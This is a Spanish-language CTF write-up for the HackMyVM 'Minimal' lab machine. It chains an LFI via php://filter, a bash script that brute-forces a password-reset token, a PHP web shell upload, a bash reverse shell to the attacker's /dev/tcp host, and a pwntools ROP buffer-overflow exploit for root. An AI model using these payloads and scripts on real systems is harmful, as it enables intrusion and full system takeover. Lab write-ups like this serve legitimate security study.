---
title: HMV - Minimal - Writeup
author: lukas
date: 2023-12-10 12:00:00 +0800
categories: [HMV]
tags: [bufferOverflow,LFI,Scripting]
pin: true
image:
    path: /images/2023-12-10-HVM-Minimal/minimal.png
---
## Enumeración

### Escaneo de puertos
Para inciar se hace un escaneo los puertos de la máquina víctima.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled.png)

Se encuentran los puertos 22 y 80 abiertos en la maquina víctima.

### escaneo de servicios

Una vez obtenido los puertos de la maquina procedo a indentficar la versión y servicios que corren en dichos puertos

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%201.png)

En base a  lo obtenido, deduzco que el vector de ataque pueder ser por el servicio http, ya que las versiones de ssh recientes no suelen tener problemas de seguridad criticos.

---
## Obtención de acceso

Antes de aplicar fuerza bruta para enumerar directorios, prefiero examinar un poco la pagina web para ver si puedo rescatar algo.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%202.png)

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%203.png)

Parece ser una tienda donde se debe estar logeado para poder comprar. Por ende me creo un usuario e intento comprar algún producto.

### LFI y Wrappers
![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%204.png)

Al momento de hacer una compra me fijo en la url, la cual en base al parametro action está llamando a buy, este podria ser o no un archivo, por lo que intento cambiar el valor del parametro para ver si realmente se trata de un LFI.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%205.png)

Y efectivamente es un LFI y si nos fijamos bien parece ser que le está concatenando la extensión `.php` al final y se está interpretando, en base a esto se me ocurre probar con wrappers a para ver si puedo incluir un archivo local de la maquina en base64 y luego le hago un decode en mi equipo para ver su contenido.

`http://192.168.1.43/shop_cart.php?action=php://filter/convert.base64-encode/resource=index`

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%206.png)

Ahora bien se que puedo incluir archivos, por lo que aplicaré fuzzing para ver si existen más archivos disponibles.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%207.png)

En base a lo encontrado y luego de ver el contenido de cada uno de los archivos hay 2 en particular que me llaman la atención, config.php y admin.php.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%208.png)

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%209.png)

El primero tiene una contraseña y el segundo parece verificar un username igual a admin, esto quiere decir que probablemente el usuario existe, intento probar el usuario admin y la contraseña del archivo config.php, pero parece ser que no corresponse a ese usuario.

Si recordamos en el panel de login tenia un link a `forgot password?` por lo que parece ser que existe un mecanismo para cambiar la contraseña, indagando más en los archivos obtenidos del LFI, me encuentro lo siguiente.

En el archivo `reset_pass.php` , existe 2 metodos.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2010.png)

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2011.png)

En el primero a través del metodo POST genera un token concatenando el nombre el usuario con un numero random del 1 al 100, luego obtiene el hash md5 de esa cadena y por ultimo la convierte en base64 y la almacena en la base de datos.

En la segunda funcion a través del metodo GET se nos pide por parametros el usuario, el token y la nueva contraseña para actualizarla.

Por lo que se me ocurre generar esos tokens, ya que son solo 100 posibles valores.

Primero creo la solicitud de cambiar la contraseña

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2012.png)

Ahora para generar el token lo hago con el siguiente script en bash

```bash
#!/bin/bash
echo -e "\n\n [+] Intentado cambiar password"
for user in $(echo admin{1..100});do
  # es importante eliminar los saltos de linea
  token=$(echo -n $user | md5sum | awk '{print $1}'| tr -d '\n' | base64)
  curl -X GET "http://192.168.1.43/reset_pass.php?user=admin&token=$token&newpass=$1" -s | grep "token" &>/dev/null
  if [ $? -eq 1 ];then
    echo -e "\n\n [+] Password de admin cambiada a '$1'"
    exit 0
  fi
done

echo -e "\n\n [-] No se pudo cambiar la password"
exit 1
```
{: file="create_toke.sh" }

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2013.png)

Ahora estando como admin tengo el siguiente panel, donde se nos permite subir un archivo. 

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2014.png)

Revisando su código nos damos cuenta que no se aplica ninguna sanitización, por lo que simplemente subimos un archivo .php y vamos al directorio donde se guarda

Archivo admin.php:

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2015.png)

```php
<?  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```
{: file="shell.sh" }

Me mando una reverse shell ingresando a la siguiente url mientras en mi equipo estoy en escucha en el puerto 443 (recordar siempre url codear los ampersand).

`192.168.1.43/imgs/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.24/443 0>%261"`

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2016.png)

Antes de pasar a la siguiente fase hago un tratamiento de la TTY 

```bash
script /dev/null -c bash
ctrl+z
stty raw -echo;fg
reset xterm
export XTERM=xterm-256color
stty rows 55 columns 209 
# este ultimo paso es para que tengo colores
source /etc/skel/.bashrc
```
---

## Escalada a root

Para esta fase hago un reconocimiento incial de la máquina, buscando usuarios, permisos suid, tareas cron, servicios internos, etc. Pero al momento de hacer un `sudo -l`, me percato de que existe un binario el cual puedo ejecutar como root y sin proporcionar contraseña.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2017.png)

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2018.png)

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2019.png)

Como se observa parece ser un quiz, luego de probrar varios imputos con el binario ocurre lo siguiente.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2020.png)

Por lo que lo traigo a mi equipo para examinarlo mejor utilizando `ghidra` (En este punto para analizar el binario me cambio a un kali linux por que más adelante tengo un problema con las librerias al momento de correr el binario).

Revisando las funciones me encuentro con esto 

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2021.png)

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2022.png)

Si nos fijamos se establece un buffer para la variable que guarda el valor de la primera pregunta que se nos hace, la funcion fgets tiene un limite de 200 bytes pero el buffer de la variable local_78 es de 112, por lo tanto al ser menor se puede acontecer un buffer overflow.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2023.png)

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2024.png)

Efectivamente, estamos sobreescribiendo registros como el RSP, ahora que ya sabemos que se está rescribiendo el RSP, verificamos las protecciones que tiene el binario y también si está el ASLR activado.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2025.png)

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2026.png)

Tenemos que el NX está activado y el ASLR también, por lo que no podemos interpretar codigo de la pila (NX) y tampoco podemos obtener directamente la dirección de libc para hacer un ret2libc dado que hay aleatoriedad en ciertas partes de la memoria (ASLR).

Revisando más a fondo el binario me percato de que existe una llamada a `system`, por lo que me podría aprovechar de esa llamada para cargar una cadena `sh` en esta función utilzando ROP, pero primero debo encontrar el offset, un gadget, la dirección de la cadena sh y la dirección de función system.

### Offset

El offset lo podemos encontrar utilizando gdb, para lo cual hacemos un `pattern create` para luego calcular el offset con el patrón creado.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2027.png)

Con esto obtenemos el offset el cual es de 120, para llegar a sobreescribir el `$rsp`.

### Gadget

Para encontrar un gadget que me permita carga la cadena `sh` en rdi, siguiendo el convenio de llamadas `RDI, RSI, RDX, RCX, R8, R9`, busco un `pop rdi; ret` con la herramienta ropper.

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2028.png)

### Dirección de system y sh

Primero para obtener la dirección de system dentro del plt utilizo objdump

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2029.png)

Y luego para saber si existe la cadena sh, utilizo gdb (gef), y coloco un breakpoint en el main para buscar por la cadena “sh”

![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2030.png)

en este caso pueden ser la dirección `0x4021f5` o `0x4031f5`.

Ahora con todas las direcciones puedo armar el siguiente payload en python

`payload = offset*A + pop_rdi + sh_addr + system_addr` 

### Explotación
Por último para poder enviar ese payload debo compartir el binario a traves de algún puerto en la máquina víctima, utilizaré un binario estatico de socat para redireccionar el trafico hacia el programa.

```python
#!/usr/bin/python3

import signal
import sys
from pwn import *
def def_handler(sig,frame):
    print("\n\n[-] Saliendo ......")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)
if __name__ == "__main__":
    offset = 120
    junk = b"A"*offset
    pop_rdi = p64(0x4015dd)
    sh_addr = p64(0x4031f5)
    system_addr = p64(0x40124f)
    payload = junk + pop_rdi + sh_addr +system_addr

    try:

        p = remote("192.168.1.43",9001)
    except Exception as e:
        log.error(str(e))

    p.sendline(payload)
    p.interactive()
```
{: file="exploit.py" }


![Untitled](/images/2023-12-10-HVM-Minimal/Untitled%2031.png)

Y con esto ya estariamos como root dentro de la máquina víctima.
